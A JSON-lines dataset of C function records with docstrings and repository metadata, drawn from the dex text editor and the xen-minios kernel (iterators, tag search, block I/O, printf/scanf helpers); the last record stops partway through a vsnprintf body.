{"docstring": "/*\n * Move after next newline (beginning of next line or end of file).\n * Returns number of bytes iterator advanced.\n */\n", "func_signal": "long block_iter_eat_line(struct block_iter *bi)", "code": "{\n\tlong offset;\n\n\tblock_iter_normalize(bi);\n\n\toffset = bi->offset;\n\tif (offset == bi->blk->size)\n\t\treturn 0;\n\n\t// there must be at least one newline\n\tif (bi->blk->nl == 1) {\n\t\tbi->offset = bi->blk->size;\n\t} else {\n\t\tconst unsigned char *end;\n\t\tend = memchr(bi->blk->data + offset, '\\n', bi->blk->size - offset);\n\t\tbi->offset = end + 1 - bi->blk->data;\n\t}\n\treturn bi->offset - offset;\n}", "path": "iter.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// both parameters must be absolute and clean\n", "func_signal": "static char *path_relative(const char *filename, const char *dir)", "code": "{\n\tint dlen = strlen(dir);\n\n\tif (!str_has_prefix(filename, dir)) {\n\t\treturn NULL;\n\t}\n\tif (filename[dlen] == 0) {\n\t\t// equal strings\n\t\treturn xstrdup(\".\");\n\t}\n\tif (filename[dlen] != '/') {\n\t\treturn NULL;\n\t}\n\treturn xstrdup(filename + dlen + 1);\n}", "path": "tag.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// like mask_color() but can change bg color only if it has not been changed yet\n", "func_signal": "static void mask_color2(struct term_color *color, const struct term_color *over)", "code": "{\n\tif (over->fg != -2)\n\t\tcolor->fg = over->fg;\n\tif (over->bg != -2 && is_default_bg_color(color->bg))\n\t\tcolor->bg = over->bg;\n\tif (!(over->attr & ATTR_KEEP))\n\t\tcolor->attr = over->attr;\n}", "path": "screen-view.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "/*\n * s/abc/x\n *\n * string                to match against\n * -------------------------------------------\n * \"foo abc bar abc baz\" \"foo abc bar abc baz\"\n * \"foo x bar abc baz\"   \" bar abc baz\"\n */\n", "func_signal": "static int replace_on_line(struct lineref *lr, regex_t *re, const char *format,\n\tstruct block_iter *bi, unsigned int *flagsp)", "code": "{\n\tunsigned char *buf = (unsigned char *)lr->line;\n\tunsigned int flags = *flagsp;\n\tregmatch_t m[MAX_SUBSTRINGS];\n\tsize_t pos = 0;\n\tint eflags = 0;\n\tint nr = 0;\n\n\twhile (regexp_exec(re, buf + pos, lr->size - pos, MAX_SUBSTRINGS, m, eflags)) {\n\t\tint match_len = m[0].rm_eo - m[0].rm_so;\n\t\tbool skip = false;\n\n\t\t/* move cursor to beginning of the text to replace */\n\t\tblock_iter_skip_bytes(bi, m[0].rm_so);\n\t\tview->cursor = *bi;\n\n\t\tif (flags & REPLACE_CONFIRM) {\n\t\t\tswitch (get_confirmation(\"Ynaq\", \"Replace?\")) {\n\t\t\tcase 'y':\n\t\t\t\tbreak;\n\t\t\tcase 'n':\n\t\t\t\tskip = true;\n\t\t\t\tbreak;\n\t\t\tcase 'a':\n\t\t\t\tflags &= ~REPLACE_CONFIRM;\n\t\t\t\t*flagsp = flags;\n\n\t\t\t\t/* record rest of the changes as one chain */\n\t\t\t\tbegin_change_chain();\n\t\t\t\tbreak;\n\t\t\tcase 'q':\n\t\t\tcase 0:\n\t\t\t\t*flagsp = flags | REPLACE_CANCEL;\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t}\n\n\t\tif (skip) {\n\t\t\t/* move cursor after the matched text */\n\t\t\tblock_iter_skip_bytes(&view->cursor, match_len);\n\t\t} else {\n\t\t\tGBUF(b);\n\n\t\t\tbuild_replacement(&b, buf + pos, format, m);\n\n\t\t\t/* lineref is invalidated by modification */\n\t\t\tif (buf == lr->line)\n\t\t\t\tbuf = xmemdup(buf, lr->size);\n\n\t\t\tbuffer_replace_bytes(match_len, b.buffer, b.len);\n\t\t\tnr++;\n\n\t\t\t/* update selection length */\n\t\t\tif (view->selection) {\n\t\t\t\tview->sel_eo += b.len;\n\t\t\t\tview->sel_eo -= match_len;\n\t\t\t}\n\n\t\t\t/* move cursor after the replaced text */\n\t\t\tblock_iter_skip_bytes(&view->cursor, b.len);\n\t\t\tgbuf_free(&b);\n\t\t}\n\t\t*bi = view->cursor;\n\n\t\tif (!match_len)\n\t\t\tbreak;\n\n\t\tif (!(flags & REPLACE_GLOBAL))\n\t\t\tbreak;\n\n\t\tpos += m[0].rm_so + match_len;\n\n\t\t/* don't match beginning of line again */\n\t\teflags = REG_NOTBOL;\n\t}\nout:\n\tif (buf != lr->line)\n\t\tfree(buf);\n\treturn nr;\n}", "path": "search.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// for sorting tags\n", "func_signal": "static int visibility_cmp(const struct tag *a, const struct tag *b)", "code": "{\n\tbool a_this_file = false;\n\tbool b_this_file = false;\n\n\tif (!a->local && !b->local)\n\t\treturn 0;\n\n\t// Is tag visibility limited to the current file?\n\tif (a->local)\n\t\ta_this_file = current_filename && streq(current_filename, a->filename);\n\tif (b->local)\n\t\tb_this_file = current_filename && streq(current_filename, b->filename);\n\n\t// Tags local to other file than current are not interesting.\n\tif (a->local && !a_this_file) {\n\t\t// a is not interesting\n\t\tif (b->local && !b_this_file) {\n\t\t\t// b is equally uninteresting\n\t\t\treturn 0;\n\t\t}\n\t\t// b is more interesting, sort it before a\n\t\treturn 1;\n\t}\n\tif (b->local && !b_this_file) {\n\t\t// b is not interesting\n\t\treturn -1;\n\t}\n\n\t// both are NOT UNinteresting\n\n\tif (a->local && a_this_file) {\n\t\tif (b->local && b_this_file)\n\t\t\treturn 0;\n\t\t// a is more interesting bacause it is local symbol\n\t\treturn -1;\n\t}\n\tif (b->local && b_this_file) {\n\t\t// b is more interesting bacause it is local symbol\n\t\treturn 1;\n\t}\n\treturn 0;\n}", "path": "tag.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// used to check if nr_errors changed\n", "func_signal": "static bool no_syntax(void)", "code": "{\n\tif (current_syntax)\n\t\treturn false;\n\terror_msg(\"No syntax started\");\n\treturn true;\n}", "path": "state.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// filename must not contain trailing slashes (but it can be \"/\")\n", "func_signal": "const char *path_basename(const char *filename)", "code": "{\n\tconst char *slash = strrchr(filename, '/');\n\tif (slash == NULL) {\n\t\treturn filename;\n\t}\n\treturn slash + 1;\n}", "path": "path.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// find \"tags\" file from directory path and its parent directories\n", "func_signal": "static int open_tag_file(char *path)", "code": "{\n\tconst char tags[] = \"tags\";\n\n\twhile (*path) {\n\t\tint fd, len = strlen(path);\n\t\tchar *slash = strrchr(path, '/');\n\n\t\tif (slash != path + len - 1) {\n\t\t\tpath[len++] = '/';\n\t\t}\n\t\tmemcpy(path + len, tags, sizeof(tags));\n\t\tfd = open(path, O_RDONLY);\n\t\tif (fd >= 0) {\n\t\t\treturn fd;\n\t\t}\n\t\tif (errno != ENOENT) {\n\t\t\treturn -1;\n\t\t}\n\t\t*slash = 0;\n\t}\n\terrno = ENOENT;\n\treturn -1;\n}", "path": "tag.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// highlight certain words inside comments\n", "func_signal": "static void hl_words(struct line_info *info)", "code": "{\n\tstruct hl_color *cc = find_color(\"comment\");\n\tstruct hl_color *nc = find_color(\"notice\");\n\tint i, j, si, max;\n\n\tif (info->colors == NULL || cc == NULL || nc == NULL)\n\t\treturn;\n\n\ti = info->pos;\n\tif (i >= info->size)\n\t\treturn;\n\n\t// go to beginning of partially visible word inside comment\n\twhile (i > 0 && info->colors[i] == cc && is_word_byte(info->line[i]))\n\t\ti--;\n\n\t// This should be more than enough. I'm too lazy to iterate characters\n\t// instead of bytes and calculate text width.\n\tmax = info->pos + screen_w * 4 + 8;\n\n\twhile (i < info->size) {\n\t\tif (info->colors[i] != cc || !is_word_byte(info->line[i])) {\n\t\t\tif (i > max)\n\t\t\t\tbreak;\n\t\t\ti++;\n\t\t} else {\n\t\t\t// beginning of a word inside comment\n\t\t\tsi = i++;\n\t\t\twhile (i < info->size && info->colors[i] == cc && is_word_byte(info->line[i]))\n\t\t\t\ti++;\n\t\t\tif (is_notice(info->line + si, i - si)) {\n\t\t\t\tfor (j = si; j < i; j++)\n\t\t\t\t\tinfo->colors[j] = nc;\n\t\t\t}\n\t\t}\n\t}\n}", "path": "screen-view.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "/*\n * Move to beginning of previous line.\n * Returns number of bytes moved which is zero if there's no previous line.\n */\n", "func_signal": "long block_iter_prev_line(struct block_iter *bi)", "code": "{\n\tstruct block *blk = bi->blk;\n\tlong offset = bi->offset;\n\tlong start = offset;\n\n\twhile (offset && blk->data[offset - 1] != '\\n')\n\t\toffset--;\n\n\tif (!offset) {\n\t\tif (blk->node.prev == bi->head)\n\t\t\treturn 0;\n\t\tbi->blk = blk = BLOCK(blk->node.prev);\n\t\toffset = blk->size;\n\t\tstart += offset;\n\t}\n\n\toffset--;\n\twhile (offset && blk->data[offset - 1] != '\\n')\n\t\toffset--;\n\tbi->offset = offset;\n\treturn start - offset;\n}", "path": "iter.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// returns NULL only if name isn't in builtin array\n", "func_signal": "char *expand_builtin_env(const char *name)", "code": "{\n\tint i;\n\n\tfor (i = 0; i < ARRAY_COUNT(builtin); i++) {\n\t\tconst struct builtin_env *be = &builtin[i];\n\t\tif (streq(be->name, name)) {\n\t\t\treturn be->expand();\n\t\t}\n\t}\n\treturn NULL;\n}", "path": "env.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// line must be non-empty\n", "func_signal": "static struct token *check_line(struct token *tok, int *ip)", "code": "{\n\tstruct token *start;\n\tint tok_type;\n\n\tstart = tok = get_indent(tok, ip);\n\n\ttok_type = tok->type;\n\tswitch (tok_type) {\n\tcase TOK_TEXT:\n\tcase TOK_BOLD:\n\tcase TOK_ITALIC:\n\tcase TOK_BR:\n\t\ttok = tok->next;\n\t\twhile (tok != &head) {\n\t\t\tswitch (tok->type) {\n\t\t\tcase TOK_TEXT:\n\t\t\tcase TOK_BOLD:\n\t\t\tcase TOK_ITALIC:\n\t\t\tcase TOK_BR:\n\t\t\tcase TOK_INDENT:\n\t\t\t\tbreak;\n\t\t\tcase TOK_NL:\n\t\t\t\treturn start;\n\t\t\tdefault:\n\t\t\t\tsyntax(tok->line, \"@%s not allowed inside paragraph\\n\",\n\t\t\t\t\t\tkeyword_name(tok->type));\n\t\t\t}\n\t\t\ttok = tok->next;\n\t\t}\n\t\tbreak;\n\tcase TOK_H1:\n\tcase TOK_H2:\n\tcase TOK_TITLE:\n\t\tif (*ip)\n\t\t\tgoto indentation;\n\n\t\t// check arguments\n\t\ttok = tok->next;\n\t\twhile (tok != &head) {\n\t\t\tswitch (tok->type) {\n\t\t\tcase TOK_TEXT:\n\t\t\tcase TOK_INDENT:\n\t\t\t\tbreak;\n\t\t\tcase TOK_NL:\n\t\t\t\treturn start;\n\t\t\tdefault:\n\t\t\t\tsyntax(tok->line, \"@%s can contain only text\\n\",\n\t\t\t\t\t\tkeyword_name(tok_type));\n\t\t\t}\n\t\t\ttok = tok->next;\n\t\t}\n\t\tbreak;\n\tcase TOK_LI:\n\t\t// check arguments\n\t\ttok = tok->next;\n\t\twhile (tok != &head) {\n\t\t\tswitch (tok->type) {\n\t\t\tcase TOK_TEXT:\n\t\t\tcase TOK_BOLD:\n\t\t\tcase TOK_ITALIC:\n\t\t\tcase TOK_INDENT:\n\t\t\t\tbreak;\n\t\t\tcase TOK_NL:\n\t\t\t\treturn start;\n\t\t\tdefault:\n\t\t\t\tsyntax(tok->line, \"@%s not allowed inside @li\\n\",\n\t\t\t\t\t\tkeyword_name(tok->type));\n\t\t\t}\n\t\t\ttok = tok->next;\n\t\t}\n\t\tbreak;\n\tcase TOK_PRE:\n\t\t// checked later\n\t\tbreak;\n\tcase TOK_RAW:\n\t\tif (*ip)\n\t\t\tgoto indentation;\n\t\t// checked later\n\t\tbreak;\n\tcase TOK_ENDPRE:\n\tcase TOK_ENDRAW:\n\t\tsyntax(tok->line, \"@%s not expected\\n\", keyword_name(tok->type));\n\t\tbreak;\n\tcase TOK_NL:\n\tcase TOK_INDENT:\n\t\tBUG();\n\t\tbreak;\n\t}\n\treturn start;\nindentation:\n\tsyntax(tok->line, \"indentation before @%s\\n\", keyword_name(tok->type));\n}", "path": "Documentation\\ttman.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// bi should be at bol\n", "func_signal": "void fill_line_ref(struct block_iter *bi, struct lineref *lr)", "code": "{\n\tlong max;\n\tconst unsigned char *nl;\n\n\tblock_iter_normalize(bi);\n\n\tlr->line = bi->blk->data + bi->offset;\n\tmax = bi->blk->size - bi->offset;\n\tif (max == 0) {\n\t\t// cursor at end of last block\n\t\tlr->size = 0;\n\t\treturn;\n\t}\n\tif (bi->blk->nl == 1) {\n\t\tlr->size = max - 1;\n\t\treturn;\n\t}\n\tnl = memchr(lr->line, '\\n', max);\n\tlr->size = nl - lr->line;\n}", "path": "iter.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "/*\n * do_exit: This is called whenever an IRET fails in entry.S.\n * This will generally be because an application has got itself into\n * a really bad state (probably a bad CS or SS). It must be killed.\n * Of course, minimal OS doesn't have applications :-)\n */\n", "func_signal": "void do_exit(void)", "code": "{\n    printk(\"Do_exit called!\\n\");\n    stack_walk();\n    for( ;; )\n    {\n        struct sched_shutdown sched_shutdown = { .reason = SHUTDOWN_crash };\n        HYPERVISOR_sched_op(SCHEDOP_shutdown, &sched_shutdown);\n    }\n}", "path": "kernel.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/*\n * INITIAL C ENTRY POINT.\n */\n", "func_signal": "void start_kernel(start_info_t *si)", "code": "{\n    static char hello[] = \"Bootstrapping...\\n\";\n\n    (void)HYPERVISOR_console_io(CONSOLEIO_write, strlen(hello), hello);\n\n    arch_init(si);\n\n    trap_init();\n\n    /* print out some useful information  */\n    printk(\"Xen Minimal OS!\\n\");\n    printk(\"  start_info: %p(VA)\\n\", si);\n    printk(\"    nr_pages: 0x%lx\\n\", si->nr_pages);\n    printk(\"  shared_inf: 0x%08lx(MA)\\n\", si->shared_info);\n    printk(\"     pt_base: %p(VA)\\n\", (void *)si->pt_base); \n    printk(\"nr_pt_frames: 0x%lx\\n\", si->nr_pt_frames);\n    printk(\"    mfn_list: %p(VA)\\n\", (void *)si->mfn_list); \n    printk(\"   mod_start: 0x%lx(VA)\\n\", si->mod_start);\n    printk(\"     mod_len: %lu\\n\", si->mod_len); \n    printk(\"       flags: 0x%x\\n\", (unsigned int)si->flags);\n    printk(\"    cmd_line: %s\\n\",  \n           si->cmd_line ? (const char *)si->cmd_line : \"NULL\");\n\n    /* Set up events. */\n    init_events();\n    \n    /* ENABLE EVENT DELIVERY. This is disabled at start of day. */\n    __sti();\n\n    arch_print_info();\n\n    setup_xen_features();\n\n    /* Init memory management. */\n    init_mm();\n\n    /* Init time and timers. */\n    init_time();\n\n    /* Init the console driver. */\n    init_console();\n\n    /* Init grant tables */\n    init_gnttab();\n    \n    /* Init scheduler. */\n    init_sched();\n \n    /* Init XenBus */\n    init_xenbus();\n\n    /* Call (possibly overridden) app_main() */\n    app_main(&start_info);\n\n    /* Everything initialised, start idle thread */\n    run_idle_thread();\n}", "path": "kernel.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/*\n * Block the domain until until(nanoseconds) is over.\n * If block is called no timerinterrupts are delivered from xen!\n */\n", "func_signal": "void\nblock_domain(s_time_t until)", "code": "{\n\tstruct ia64_pal_result pal_res;\n\tuint64_t c, new;\n\n\tc = ns_to_cycles(until);\n\tnew = ia64_get_itc() + c - NOW();\n\tia64_set_itm(new);\t\t/* Reload cr.itm */\n\t/*\n\t * PAL_HALT_LIGHT returns on every external interrupt,\n\t * including timer interrupts.\n\t */\n\tpal_res = ia64_call_pal_static(PAL_HALT_LIGHT, 0, 0, 0);\n\tif (pal_res.pal_status != 0)\n\t\tprintk(\"%s: PAL_HALT_LIGHT returns an error\\n\");\n\t/* Reload the normal timer interrupt match. */\n\tnew = ia64_get_itc() + itm_val;\n\tia64_set_itm(new);\n}", "path": "arch\\ia64\\time.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/**\n * simple_strtoull - convert a string to an unsigned long long\n * @cp: The start of the string\n * @endp: A pointer to the end of the parsed string will be placed here\n * @base: The number base to use\n */\n", "func_signal": "unsigned long long simple_strtoull(const char *cp,char **endp,unsigned int base)", "code": "{\n    unsigned long long result = 0,value;\n\n    if (!base) {\n        base = 10;\n        if (*cp == '0') {\n            base = 8;\n            cp++;\n            if ((*cp == 'x') && isxdigit(cp[1])) {\n                cp++;\n                base = 16;\n            }\n        }\n    }\n    while (isxdigit(*cp) && (value = isdigit(*cp) ? *cp-'0' : (islower(*cp)\n                                                               ? toupper(*cp) : *cp)-'A'+10) < base) {\n        result = result*base + value;\n        cp++;\n    }\n    if (endp)\n        *endp = (char *)cp;\n    return result;\n}", "path": "lib\\printf.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/**\n * simple_strtoul - convert a string to an unsigned long\n * @cp: The start of the string\n * @endp: A pointer to the end of the parsed string will be placed here\n * @base: The number base to use\n */\n", "func_signal": "unsigned long simple_strtoul(const char *cp,char **endp,unsigned int base)", "code": "{\n    unsigned long result = 0,value;\n\n    if (!base) {\n        base = 10;\n        if (*cp == '0') {\n            base = 8;\n            cp++;\n            if ((*cp == 'x') && isxdigit(cp[1])) {\n                cp++;\n                base = 16;\n            }\n        }\n    }\n    while (isxdigit(*cp) &&\n           (value = isdigit(*cp) ? *cp-'0' : toupper(*cp)-'A'+10) < base) {\n        result = result*base + value;\n        cp++;\n    }\n    if (endp)\n        *endp = (char *)cp;\n    return result;\n}", "path": "lib\\printf.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/**\n * simple_strtol - convert a string to a signed long\n * @cp: The start of the string\n * @endp: A pointer to the end of the parsed string will be placed here\n * @base: The number base to use\n */\n", "func_signal": "long simple_strtol(const char *cp,char **endp,unsigned int base)", "code": "{\n    if(*cp=='-')\n        return -simple_strtoul(cp+1,endp,base);\n    return simple_strtoul(cp,endp,base);\n}", "path": "lib\\printf.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/**\n * vsscanf - Unformat a buffer into a list of arguments\n * @buf:\tinput buffer\n * @fmt:\tformat of buffer\n * @args:\targuments\n */\n", "func_signal": "int vsscanf(const char * buf, const char * fmt, va_list args)", "code": "{\n\tconst char *str = buf;\n\tchar *next;\n\tchar digit;\n\tint num = 0;\n\tint qualifier;\n\tint base;\n\tint field_width;\n\tint is_sign = 0;\n\n\twhile(*fmt && *str) {\n\t\t/* skip any white space in format */\n\t\t/* white space in format matchs any amount of\n\t\t * white space, including none, in the input.\n\t\t */\n\t\tif (isspace(*fmt)) {\n\t\t\twhile (isspace(*fmt))\n\t\t\t\t++fmt;\n\t\t\twhile (isspace(*str))\n\t\t\t\t++str;\n\t\t}\n\n\t\t/* anything that is not a conversion must match exactly */\n\t\tif (*fmt != '%' && *fmt) {\n\t\t\tif (*fmt++ != *str++)\n\t\t\t\tbreak;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (!*fmt)\n\t\t\tbreak;\n\t\t++fmt;\n\t\t\n\t\t/* skip this conversion.\n\t\t * advance both strings to next white space\n\t\t */\n\t\tif (*fmt == '*') {\n\t\t\twhile (!isspace(*fmt) && *fmt)\n\t\t\t\tfmt++;\n\t\t\twhile (!isspace(*str) && *str)\n\t\t\t\tstr++;\n\t\t\tcontinue;\n\t\t}\n\n\t\t/* get field width */\n\t\tfield_width = -1;\n\t\tif (isdigit(*fmt))\n\t\t\tfield_width = skip_atoi(&fmt);\n\n\t\t/* get conversion qualifier */\n\t\tqualifier = -1;\n\t\tif (*fmt == 'h' || *fmt == 'l' || *fmt == 'L' ||\n\t\t    *fmt == 'Z' || *fmt == 'z') {\n\t\t\tqualifier = *fmt++;\n\t\t\tif (unlikely(qualifier == *fmt)) {\n\t\t\t\tif (qualifier == 'h') {\n\t\t\t\t\tqualifier = 'H';\n\t\t\t\t\tfmt++;\n\t\t\t\t} else if (qualifier == 'l') {\n\t\t\t\t\tqualifier = 'L';\n\t\t\t\t\tfmt++;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tbase = 10;\n\t\tis_sign = 0;\n\n\t\tif (!*fmt || !*str)\n\t\t\tbreak;\n\n\t\tswitch(*fmt++) {\n\t\tcase 'c':\n\t\t{\n\t\t\tchar *s = (char *) va_arg(args,char*);\n\t\t\tif (field_width == -1)\n\t\t\t\tfield_width = 1;\n\t\t\tdo {\n\t\t\t\t*s++ = *str++;\n\t\t\t} while (--field_width > 0 && *str);\n\t\t\tnum++;\n\t\t}\n\t\tcontinue;\n\t\tcase 's':\n\t\t{\n\t\t\tchar *s = (char *) va_arg(args, char *);\n\t\t\tif(field_width == -1)\n\t\t\t\tfield_width = INT_MAX;\n\t\t\t/* first, skip leading white space in buffer */\n\t\t\twhile (isspace(*str))\n\t\t\t\tstr++;\n\n\t\t\t/* now copy until next white space */\n\t\t\twhile (*str && !isspace(*str) && field_width--) {\n\t\t\t\t*s++ = *str++;\n\t\t\t}\n\t\t\t*s = '\\0';\n\t\t\tnum++;\n\t\t}\n\t\tcontinue;\n\t\tcase 'n':\n\t\t\t/* return number of characters read so far */\n\t\t{\n\t\t\tint *i = (int *)va_arg(args,int*);\n\t\t\t*i = str - buf;\n\t\t}\n\t\tcontinue;\n\t\tcase 'o':\n\t\t\tbase = 8;\n\t\t\tbreak;\n\t\tcase 'x':\n\t\tcase 'X':\n\t\t\tbase = 16;\n\t\t\tbreak;\n\t\tcase 'i':\n                        base = 0;\n\t\tcase 'd':\n\t\t\tis_sign = 1;\n\t\tcase 'u':\n\t\t\tbreak;\n\t\tcase '%':\n\t\t\t/* looking for '%' in str */\n\t\t\tif (*str++ != '%') \n\t\t\t\treturn num;\n\t\t\tcontinue;\n\t\tdefault:\n\t\t\t/* invalid format; stop here */\n\t\t\treturn num;\n\t\t}\n\n\t\t/* have some sort of integer conversion.\n\t\t * first, skip white space in buffer.\n\t\t */\n\t\twhile (isspace(*str))\n\t\t\tstr++;\n\n\t\tdigit = *str;\n\t\tif (is_sign && digit == '-')\n\t\t\tdigit = *(str + 1);\n\n\t\tif (!digit\n                    || (base == 16 && !isxdigit(digit))\n                    || (base == 10 && !isdigit(digit))\n                    || (base == 8 && (!isdigit(digit) || digit > '7'))\n                    || (base == 0 && !isdigit(digit)))\n\t\t\t\tbreak;\n\n\t\tswitch(qualifier) {\n\t\tcase 'H':\t/* that's 'hh' in format */\n\t\t\tif (is_sign) {\n\t\t\t\tsigned char *s = (signed char *) va_arg(args,signed char *);\n\t\t\t\t*s = (signed char) simple_strtol(str,&next,base);\n\t\t\t} else {\n\t\t\t\tunsigned char *s = (unsigned char *) va_arg(args, unsigned char *);\n\t\t\t\t*s = (unsigned char) simple_strtoul(str, &next, base);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'h':\n\t\t\tif (is_sign) {\n\t\t\t\tshort *s = (short *) va_arg(args,short *);\n\t\t\t\t*s = (short) simple_strtol(str,&next,base);\n\t\t\t} else {\n\t\t\t\tunsigned short *s = (unsigned short *) va_arg(args, unsigned short *);\n\t\t\t\t*s = (unsigned short) simple_strtoul(str, &next, base);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'l':\n\t\t\tif (is_sign) {\n\t\t\t\tlong *l = (long *) va_arg(args,long *);\n\t\t\t\t*l = simple_strtol(str,&next,base);\n\t\t\t} else {\n\t\t\t\tunsigned long *l = (unsigned long*) va_arg(args,unsigned long*);\n\t\t\t\t*l = simple_strtoul(str,&next,base);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'L':\n\t\t\tif (is_sign) {\n\t\t\t\tlong long *l = (long long*) va_arg(args,long long *);\n\t\t\t\t*l = simple_strtoll(str,&next,base);\n\t\t\t} else {\n\t\t\t\tunsigned long long *l = (unsigned long long*) va_arg(args,unsigned long long*);\n\t\t\t\t*l = simple_strtoull(str,&next,base);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'Z':\n\t\tcase 'z':\n\t\t{\n\t\t\tsize_t *s = (size_t*) va_arg(args,size_t*);\n\t\t\t*s = (size_t) simple_strtoul(str,&next,base);\n\t\t}\n\t\tbreak;\n\t\tdefault:\n\t\t\tif (is_sign) {\n\t\t\t\tint *i = (int *) va_arg(args, int*);\n\t\t\t\t*i = (int) simple_strtol(str,&next,base);\n\t\t\t} else {\n\t\t\t\tunsigned int *i = (unsigned int*) va_arg(args, unsigned int*);\n\t\t\t\t*i = (unsigned int) simple_strtoul(str,&next,base);\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tnum++;\n\n\t\tif (!next)\n\t\t\tbreak;\n\t\tstr = next;\n\t}\n\treturn num;\n}", "path": "lib\\printf.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/* Issue an aio */\n", "func_signal": "void blkfront_aio(struct blkfront_aiocb *aiocbp, int write)", "code": "{\n    struct blkfront_dev *dev = aiocbp->aio_dev;\n    struct blkif_request *req;\n    RING_IDX i;\n    int notify;\n    int n, j;\n    uintptr_t start, end;\n\n    // Can't io at non-sector-aligned location\n    ASSERT(!(aiocbp->aio_offset & (dev->info.sector_size-1)));\n    // Can't io non-sector-sized amounts\n    ASSERT(!(aiocbp->aio_nbytes & (dev->info.sector_size-1)));\n    // Can't io non-sector-aligned buffer\n    ASSERT(!((uintptr_t) aiocbp->aio_buf & (dev->info.sector_size-1)));\n\n    start = (uintptr_t)aiocbp->aio_buf & PAGE_MASK;\n    end = ((uintptr_t)aiocbp->aio_buf + aiocbp->aio_nbytes + PAGE_SIZE - 1) & PAGE_MASK;\n    aiocbp->n = n = (end - start) / PAGE_SIZE;\n\n    /* qemu's IDE max multsect is 16 (8KB) and SCSI max DMA was set to 32KB,\n     * so max 44KB can't happen */\n    ASSERT(n <= BLKIF_MAX_SEGMENTS_PER_REQUEST);\n\n    blkfront_wait_slot(dev);\n    i = dev->ring.req_prod_pvt;\n    req = RING_GET_REQUEST(&dev->ring, i);\n\n    req->operation = write ? BLKIF_OP_WRITE : BLKIF_OP_READ;\n    req->nr_segments = n;\n    req->handle = dev->handle;\n    req->id = (uintptr_t) aiocbp;\n    req->sector_number = aiocbp->aio_offset / 512;\n\n    for (j = 0; j < n; j++) {\n        req->seg[j].first_sect = 0;\n        req->seg[j].last_sect = PAGE_SIZE / 512 - 1;\n    }\n    req->seg[0].first_sect = ((uintptr_t)aiocbp->aio_buf & ~PAGE_MASK) / 512;\n    req->seg[n-1].last_sect = (((uintptr_t)aiocbp->aio_buf + aiocbp->aio_nbytes - 1) & ~PAGE_MASK) / 512;\n    for (j = 0; j < n; j++) {\n\tuintptr_t data = start + j * PAGE_SIZE;\n        if (!write) {\n            /* Trigger CoW if needed */\n            *(char*)(data + (req->seg[j].first_sect << 9)) = 0;\n            barrier();\n        }\n\taiocbp->gref[j] = req->seg[j].gref =\n            gnttab_grant_access(dev->dom, virtual_to_mfn(data), write);\n    }\n\n    dev->ring.req_prod_pvt = i + 1;\n\n    wmb();\n    RING_PUSH_REQUESTS_AND_CHECK_NOTIFY(&dev->ring, notify);\n\n    if(notify) notify_remote_via_evtchn(dev->evtchn);\n}", "path": "blkfront.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/**\n* vsnprintf - Format a string and place it in a buffer\n* @buf: The buffer to place the result into\n* @size: The size of the buffer, including the trailing null space\n* @fmt: The format string to use\n* @args: Arguments for the format string\n*\n* Call this function if you are already dealing with a va_list.\n* You probably want snprintf instead.\n */\n", "func_signal": "int vsnprintf(char *buf, size_t size, const char *fmt, va_list args)", "code": "{\n    int len;\n    unsigned long long num;\n    int i, base;\n    char *str, *end, c;\n    const char *s;\n\n    int flags;          /* flags to number() */\n\n    int field_width;    /* width of output field */\n    int precision;              /* min. # of digits for integers; max\n                                   number of chars for from string */\n    int qualifier;              /* 'h', 'l', or 'L' for integer fields */\n                                /* 'z' support added 23/7/1999 S.H.    */\n                                /* 'z' changed to 'Z' --davidm 1/25/99 */\n\n    str = buf;\n    end = buf + size - 1;\n\n    if (end < buf - 1) {\n        end = ((void *) -1);\n        size = end - buf + 1;\n    }\n\n    for (; *fmt ; ++fmt) {\n        if (*fmt != '%') {\n            if (str <= end)\n                *str = *fmt;\n            ++str;\n            continue;\n        }\n\n        /* process flags */\n        flags = 0;\n    repeat:\n        ++fmt;          /* this also skips first '%' */\n        switch (*fmt) {\n        case '-': flags |= LEFT; goto repeat;\n        case '+': flags |= PLUS; goto repeat;\n        case ' ': flags |= SPACE; goto repeat;\n        case '#': 